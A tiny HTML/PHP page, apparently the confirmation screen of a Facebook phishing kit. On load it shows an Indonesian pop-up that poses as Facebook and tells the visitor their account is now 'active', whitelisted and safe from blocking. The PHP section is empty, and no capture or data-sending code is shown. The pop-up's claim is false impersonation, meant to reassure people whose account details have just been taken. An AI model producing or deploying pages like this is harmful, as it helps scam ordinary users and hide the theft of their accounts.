
<html>
<head>
	<title>facebook kamu aman</title>
</head>
<body>
<script>alert('Facebook kamu terdaftar AKTIF dan masuk kedalam WhiteList, terima kasih telah memberitahu kami, Sekarang Facebook Kamu Tidak Akan Kami Blokir');</script>
<?php
?>
thanks
</body>
</html>	
